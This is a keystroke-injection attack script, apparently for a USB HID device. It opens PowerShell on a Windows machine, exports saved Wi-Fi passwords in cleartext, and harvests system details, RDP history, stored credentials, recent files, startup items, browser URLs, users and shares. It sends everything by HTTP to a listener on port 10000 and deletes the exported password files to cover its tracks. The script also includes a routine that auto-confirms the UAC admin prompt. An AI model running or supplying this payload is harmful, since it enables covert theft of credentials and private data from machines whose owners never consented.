/*
Exfiltrate Cleartext WLAN Passwords and other informations and earase export file after transmission
author: Klau5t4ler0x90

Same like wlna exfiltration. First start the server.py on port 10000 or create your own.
*/

ps_wow64='%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'
ps="powershell.exe"

// sets typing speed to "natural"
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(1000);
	type("powershell.exe");
    press("ENTER")
}

// Uses search bar and CTRL+SHIFT+ENTER to run given program as admin (assumes user is admin, only confirms UAC dialog)
function win10AsAdmin(program) {
  press("GUI"); //open search
  delay(200);
  type(program); //enter target binary
  delay(500); // wait for search to finish
  press("CTRL SHIFT ENTER"); //start with CTRL+SHIFT+ENTER (run as admin)
  delay(500); //wait for confirmation dialog (no check if a password is required, assume login user is admin)
  press("SHIFT TAB"); //switch to dialog confirmation
  press("ENTER");
}

function getWlan() {
  //type("cd $env:TEMP\n");
  //press("ENTER");
  //delay(300);

  // 1. WLAN-Profile mit Klartext-Schlüssel exportieren
  type("netsh wlan export profile key=clear\n");
  press("ENTER");
  delay(1000);

  // 2. Alle XMLs einlesen, URL-encodieren und senden
  type("Add-Type -AssemblyName System.Web\n");
  press("ENTER");
  delay(200);
  type("Get-ChildItem -Filter '*.xml' | ForEach-Object {\n");
  press("ENTER");
  delay(200);
  type("  $raw = Get-Content $_.FullName -Raw\n");
  press("ENTER");
  delay(200);
  type("  $encoded = [System.Web.HttpUtility]::UrlEncode($raw)\n");
  press("ENTER");
  delay(200);
  type("  $url = 'http://172.16.0.1:10000/?datei=recon.html&data=' + $encoded\n");
  press("ENTER");
  delay(200);
  type("  try { Invoke-WebRequest -Uri $url -UseBasicParsing } catch {}\n");
  press("ENTER");
  delay(200);
  type("  Remove-Item $_.FullName -Force\n");
  press("ENTER");
  type("}\n");
  press("ENTER");
}

function exfilSystemInfo() {
  type("$sys = \"=== SYSTEMINFOS ===`n\" + (whoami) + \"`n\" + (hostname) + \"`n\" + (ipconfig) + \"`n\" + (Get-WmiObject Win32_OperatingSystem | Out-String)\n");
  press("ENTER");
  delay(300);
  type("$enc = [System.Web.HttpUtility]::UrlEncode($sys)\n");
  press("ENTER");
  delay(200);
  type("Invoke-WebRequest -Uri ('http://172.16.0.1:10000/?datei=recon.html&data=' + $enc) -UseBasicParsing\n");
  press("ENTER");
  delay(300);
}

function exfilNetworkStuff() {
  type("$net = \"=== NETZWERK & RDP ===`n\" + (net use) + \"`n`nRDP-Verlauf:`n\" + (reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Default\") + \"`n`nCMDKEY:`n\" + (cmdkey /list)\n");
  press("ENTER");
  delay(500);
  type("$enc = [System.Web.HttpUtility]::UrlEncode($net)\n");
  press("ENTER");
  delay(200);
  type("Invoke-WebRequest -Uri ('http://172.16.0.1:10000/?datei=recon.html&data=' + $enc) -UseBasicParsing\n");
  press("ENTER");
  delay(300);
}

function exfilRecentFiles() {
  type("$recent = \"=== LETZTE DATEIEN ===`n\" + (Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Recent\" | Select Name, LastWriteTime | Out-String)\n");
  press("ENTER");
  delay(300);
  type("$enc = [System.Web.HttpUtility]::UrlEncode($recent)\n");
  press("ENTER");
  delay(200);
  type("Invoke-WebRequest -Uri ('http://172.16.0.1:10000/?datei=recon.html&data=' + $enc) -UseBasicParsing\n");
  press("ENTER");
  delay(300);
}

function exfilStartupItems() {
  type("$start = \"=== AUTOSTART ===`n\" + (Get-WmiObject Win32_StartupCommand | Select Name, Command, Location | Out-String)\n");
  press("ENTER");
  delay(300);
  type("$enc = [System.Web.HttpUtility]::UrlEncode($start)\n");
  press("ENTER");
  delay(200);
  type("Invoke-WebRequest -Uri ('http://172.16.0.1:10000/?datei=recon.html&data=' + $enc) -UseBasicParsing\n");
  press("ENTER");
  delay(300);
}

function exfilTypedURLs() {
  type("$urls = \"=== IE Typed URLs ===`n\" + (Get-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Internet Explorer\\TypedURLs\" | Out-String)\n");
  press("ENTER");
  delay(300);
  type("$enc = [System.Web.HttpUtility]::UrlEncode($urls)\n");
  press("ENTER");
  delay(200);
  type("Invoke-WebRequest -Uri ('http://172.16.0.1:10000/?datei=recon.html&data=' + $enc) -UseBasicParsing\n");
  press("ENTER");
  delay(300);
}

function exfilUserLocal() {
  type("$users = \"=== Local Users ===`n\" + (net user | Out-String)\n");
  press("ENTER");
  delay(300);
  type("$enc = [System.Web.HttpUtility]::UrlEncode($users)\n");
  press("ENTER");
  delay(200);
  type("Invoke-WebRequest -Uri ('http://172.16.0.1:10000/?datei=recon.html&data=' + $enc) -UseBasicParsing\n");
  press("ENTER");
  delay(300);
}

function exfilNetShare() {
  type("$shares = \"=== SMB Shares ===`n\" + (net share | Out-String)\n");
  press("ENTER");
  delay(300);
  type("$enc = [System.Web.HttpUtility]::UrlEncode($shares)\n");
  press("ENTER");
  delay(200);
  type("Invoke-WebRequest -Uri ('http://172.16.0.1:10000/?datei=recon.html&data=' + $enc) -UseBasicParsing\n");
  press("ENTER");
  delay(300);
}

function exit() {
  type("exit");
  press("ENTER");
}


layout('de');			// US keyboard layout (choose your language)
fast();

startPS();
delay(500);

// Add reference for UrlEncoding
type("Add-Type -AssemblyName System.Web\n");
press("ENTER");
delay(300);

getWlan();
delay(300);

exfilSystemInfo();
delay(300);

exfilNetworkStuff();
delay(300);

exfilRecentFiles();
delay(300);

exfilStartupItems();
delay(300);

exfilTypedURLs();
delay(300);

exfilUserLocal();
delay(300);

exfilNetShare();
delay(300);

exit()
